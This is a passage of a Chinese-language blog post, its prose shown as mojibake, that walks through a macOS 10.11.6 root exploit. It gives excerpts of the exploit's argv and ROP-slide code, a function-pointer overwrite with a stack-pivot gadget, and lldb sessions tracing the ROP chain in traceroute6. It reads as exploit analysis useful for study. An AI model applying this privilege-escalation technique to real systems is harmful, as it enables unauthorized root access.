<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">398</span>   <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</span><br><span class="line"><span class="number">399</span>   <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</span><br><span class="line"><span class="number">400</span>   <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</span><br><span class="line"><span class="number">401</span>   target_argv[<span class="number">0</span>] = progname;</span><br><span class="line"><span class="number">402</span>   target_argv[<span class="number">1</span>] = optname;</span><br><span class="line"><span class="number">403</span>   target_argv[<span class="number">2</span>] = optval;</span><br><span class="line"><span class="number">404</span>   <span class="keyword">int</span> argn = <span class="number">3</span>;</span><br><span class="line"><span class="number">405</span>   target_argv[argn++] = &amp;args[<span class="number">0</span>];</span><br><span class="line"><span class="number">406</span>   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</span><br><span class="line"><span class="number">407</span>     <span class="keyword">if</span> (args[i-<span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">408</span>       target_argv[argn++] = &amp;args[i];</span><br><span class="line"><span class="number">409</span>     &#125;</span><br><span class="line"><span class="number">410</span>   &#125;</span><br><span class="line"><span class="number">411</span>   target_argv[argn] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>æœ€å<code>target_argv</code>çš„ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">  *  		+-------------------+</span><br><span class="line">  * 		|   progname        |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optname         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optval          |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[0]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[1]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[2]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   ...             |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[n]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   NULL            |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  */</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2_do_parent">3.2 do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">598</span>   <span class="comment">//overwrite the fptr value:</span></span><br><span class="line"><span class="number">599</span>   *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;</span><br></pre></td></tr></table></figure>
<p><code>do_parent</code>çš„è¿™ä¸€è¡Œä»£ç ä¿®æ”¹äº†<code>__clean</code>å¤„çš„åœ°å€ã€‚</p>
<p>åœ¨æ‰§è¡Œ599è¡Œä¹‹å‰è§‚å¯Ÿã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">34</span> = <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">libsystem_c.dylib`_cleanup:</span><br><span class="line">    <span class="number">0x7fff8fe8e61d</span> &lt;+<span class="number">0</span>&gt;:  push   rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e61e</span> &lt;+<span class="number">1</span>&gt;:  mov    rbp, rsp</span><br><span class="line">    <span class="number">0x7fff8fe8e621</span> &lt;+<span class="number">4</span>&gt;:  mov    rdi, qword ptr [rip - <span class="number">0x1c95c588</span>] ; (<span class="keyword">void</span> *)<span class="number">0x00007fff8fe8d6ce</span>: __sflush</span><br><span class="line">    <span class="number">0x7fff8fe8e628</span> &lt;+<span class="number">11</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e629</span> &lt;+<span class="number">12</span>&gt;: jmp    <span class="number">0x7fff8fed6c6c</span>            ; symbol stub <span class="keyword">for</span>: _fwalk</span><br></pre></td></tr></table></figure>
<p>åœ¨æ‰§è¡Œäº†<code>overwrite</code>ä¹‹åçš„å†…å­˜å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">36</span> = <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">    <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br><span class="line">    <span class="number">0x7fff8fed1cfe</span> &lt;+<span class="number">1953</span>&gt;: call   <span class="number">0x7fff8fed5fdc</span>            ; symbol stub <span class="keyword">for</span>: __error</span><br><span class="line">    <span class="number">0x7fff8fed1d03</span> &lt;+<span class="number">1958</span>&gt;: mov    dword ptr [rax], <span class="number">0x3e</span></span><br></pre></td></tr></table></figure>
<h2 id="3-3_traceroute6">3.3 traceroute6</h2><p>è¦è°ƒè¯•<code>execve</code>å¯åŠ¨çš„<code>traceroute6</code>ï¼Œå…ˆé€šè¿‡<code>lldb</code>å¯åŠ¨<code>surfacer00t_10_11_6</code>ï¼Œå¯¹<code>fork</code>ä¸‹æ–­ç‚¹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b fork&#10;Breakpoint 6: where = libsystem_c.dylib`fork, address = 0x00007fff8fe60f70</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œåˆ°<code>fork</code>åä¼šåœä¸‹æ¥ã€‚</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">*</span> thread <span class="comment">#1: tid = 0x6e32, 0x00007fff8fe60f70 libsystem_c.dylib`fork, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00007fff8fe60f70 libsystem_c.dylib`fork</span></span><br><span class="line">libsystem_c.dylib`fork:</span><br><span class="line">-&gt;  0x7fff8fe60f70 <span class="variable">&lt;+0&gt;</span>: push   rbp</span><br><span class="line">    0x7fff8fe60f71 <span class="variable">&lt;+1&gt;</span>: mov    rbp, rsp</span><br><span class="line">    0x7fff8fe60f74 <span class="variable">&lt;+4&gt;</span>: push   rbx</span><br><span class="line">    0x7fff8fe60f75 <span class="variable">&lt;+5&gt;</span>: push   rax</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ—¶å€™å¯åŠ¨å¦å¤–ä¸€ä¸ª<code>lldb</code>è¿›ç¨‹ï¼Œè¿™ä¸ª<code>lldb</code>è¦ç”¨<code>sudo</code>å¯åŠ¨ï¼Œå¦åˆ™ä¼šæ— æ³•<code>attach</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡è¿™æ¡æŒ‡ä»¤ï¼Œç­‰å¾…<code>traceroute6</code>æ‰§è¡Œã€‚åŒæ—¶ç»§ç»­æ‰§è¡Œ<code>fork</code>çš„<code>lldb</code>ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br><span class="line">There is a running process, detach from it and attach?: [Y/n]</span><br><span class="line">Process 569 detached</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP</span><br><span class="line">    frame #0: 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10</span><br><span class="line">libsystem_kernel.dylib`__write_nocancel:</span><br><span class="line">-&gt;  0x7fff8a182612 &lt;+10&gt;: jae    0x7fff8a18261c            ; &lt;+20&gt;</span><br><span class="line">    0x7fff8a182614 &lt;+12&gt;: movq   %rax, %rdi</span><br><span class="line">    0x7fff8a182617 &lt;+15&gt;: jmp    0x7fff8a17c7cd            ; cerror_nocancel</span><br><span class="line">    0x7fff8a18261c &lt;+20&gt;: retq</span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥è°ƒè¯•<code>ROP</code>çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</p>
<p>æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼Œé™¤äº†è¦<code>sudo</code>å¯åŠ¨ç¬¬äºŒä¸ª<code>lldb</code>ä¹‹å¤–ï¼Œç³»ç»Ÿè¿˜éœ€è¦å…³é—­<code>SIP</code>ï¼Œä½†æ˜¯åœ¨Parallels Desktopä¸­è¿›å…¥OS Xçš„æ¢å¤æ¨¡å¼ï¼Œæœ‰ç‚¹å¥‡ç‰¹ã€‚å¹¶ä¸æ˜¯command+Rã€‚</p>
<blockquote>
<h2 id="Information">Information</h2><p>This article describes how to boot into your OS X virtual machineâ€™s Recovery Mode on Parallels Desktop.</p>
<ol>
<li>Start Parallels Desktop but do not start your virtual machine.</li>
<li>Open virtual machineâ€™s <a href="http://kb.parallels.com/5164" target="_blank" rel="external">configuration window</a> -&gt; <strong>Hardware</strong> -&gt; <strong>Boot Order</strong>.</li>
<li>Enable <strong>Select boot device on startup</strong> option and close configuration window.</li>
<li>Start your OS X virtual machine, click on the virtual machine window to make it grab the focus and press any key when prompted:</li>
<li>On the <strong>Boot Manager</strong> window choose <strong>Mac OS X Recovery</strong>:</li>
</ol>
</blockquote>
<p>ä¹Ÿå¯ä»¥çœ‹<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹<code>__cleanup</code>å¤„çš„æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°å‡½æ•°å·²ç»è¢«æ›¿æ¢äº†ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p __cleanup&#10;(void *) $0 = 0x00007fff8fed1cec&#10;(lldb) dis -s __cleanup&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: addq   $0x1d88, %rsp             ; imm = 0x1D88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: popq   %rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: popq   %r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: popq   %r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: popq   %r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: popq   %r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: popq   %rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: retq&#10;    0x7fff8fed1cfe &#60;+1953&#62;: callq  0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: movl   $0x3e, (%rax)</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å¯¹è¿™é‡Œæ‰“æ–­ç‚¹åé‡Šæ”¾ï¼Œå°±ä¼šæ‰§è¡Œåˆ°æˆ‘ä»¬çš„æ ˆä¸Šè·³è½¬çš„ä»£ç ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b *0x00007fff8fed1cec</span><br><span class="line">Breakpoint 1: where = libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, address = 0x00007fff8fed1cec</span><br><span class="line">(lldb) c</span><br><span class="line">Process 580 resuming</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span><br><span class="line">    frame #0: 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935</span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">-&gt;  0x7fff8fed1cec &lt;+1935&gt;: addq   $0x1d88, %rsp             ; imm = 0x1D88</span><br><span class="line">    0x7fff8fed1cf3 &lt;+1942&gt;: popq   %rbx</span><br><span class="line">    0x7fff8fed1cf4 &lt;+1943&gt;: popq   %r12</span><br><span class="line">    0x7fff8fed1cf6 &lt;+1945&gt;: popq   %r13</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿ<code>$rsp</code>å¯„å­˜å™¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="keyword">register</span> read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">       rbx = <span class="number">0x0000000000000001</span></span><br><span class="line">       rcx = <span class="number">0x0000050000000000</span></span><br><span class="line">       rdx = <span class="number">0x00007fff735360d0</span>  atexit_mutex + <span class="number">32</span></span><br><span class="line">       rdi = <span class="number">0x00007fff735360b0</span>  atexit_mutex</span><br><span class="line">       rsi = <span class="number">0x0000050000000500</span></span><br><span class="line">       rbp = <span class="number">0x00007fff523dcc70</span></span><br><span class="line">       rsp = <span class="number">0x00007fff523dcc58</span></span><br><span class="line">        r8 = <span class="number">0x00000000fffffffc</span></span><br><span class="line">        r9 = <span class="number">0x00007fff735360c8</span>  atexit_mutex + <span class="number">24</span></span><br><span class="line">       r10 = <span class="number">0x00000000ffffffff</span></span><br><span class="line">       r11 = <span class="number">0xffffffff00000000</span></span><br><span class="line">       r12 = <span class="number">0x0000000000000219</span></span><br><span class="line">       r13 = <span class="number">0x000000010d823818</span>  traceroute6`___lldb_unnamed_function1$$traceroute6 + <span class="number">4828</span></span><br><span class="line">       r14 = <span class="number">0x00007fff523dd610</span></span><br><span class="line">       r15 = <span class="number">0x00007fff735372a0</span>  optarg</span><br><span class="line">       rip = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">    rflags = <span class="number">0x0000000000000202</span></span><br><span class="line">        cs = <span class="number">0x000000000000002b</span></span><br><span class="line">        fs = <span class="number">0x0000000000000000</span></span><br><span class="line">        gs = <span class="number">0x0000000000000000</span></span><br><span class="line">        </span><br><span class="line">(lldb) memory read -size <span class="number">8</span> -format x -count <span class="number">100</span>  <span class="number">0x00007fff523dcc58</span>+<span class="number">0x1d88</span></span><br><span class="line"><span class="number">0x7fff523de9e0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523de9f0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea00</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea10</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea20</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea30</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea40</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea50</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea60</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea70</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea80</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea90</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523deaa0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x7fff523decb0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decc0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decd0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dece0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decf0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œ<code>0x7fff8fed1cec</code>å¤„å¼€å§‹çš„<code>gad_get</code>ä¹‹åï¼Œå°±ä¼šä¿®æ”¹<code>rsp</code>,å¹¶é€šè¿‡<code>ret</code>æŒ‡ä»¤ï¼Œè·³è½¬åˆ°å…·ä½“çš„<code>payload</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œçš„æµç¨‹å¤§è‡´å¦‚ä¸‹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;    0x7fff8fed1d09 &#60;+1964&#62;: jmp    0x7fff8fed1734            ; &#60;+471&#62;&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85&#10;libsystem_c.dylib`strcpy:&#10;-&#62;  0x7fff8fe520d5 &#60;+85&#62;: ret&#10;    0x7fff8fe520d6 &#60;+86&#62;: movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;: movdqu xmmword ptr [rdi], xmm0&#10;    0x7fff8fe520df &#60;+95&#62;: mov    rax, rdi</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€åä¸€ä¸ªæ‰§è¡Œçš„ æ˜¯<code>0x7fff8fe520d5</code>å¤„çš„<code>ret</code>ã€‚</p>
<p>è§‚å¯Ÿå¯„å­˜å™¨å¯ä»¥å‘ç°$rip=<code>0x00007fff8fe520d5</code>,$rsp=<code>0x00007fff523dea18</code>ã€‚è€Œæ ˆå·²ç»å˜æˆäº†è¿™æ ·äº†ã€‚</p>
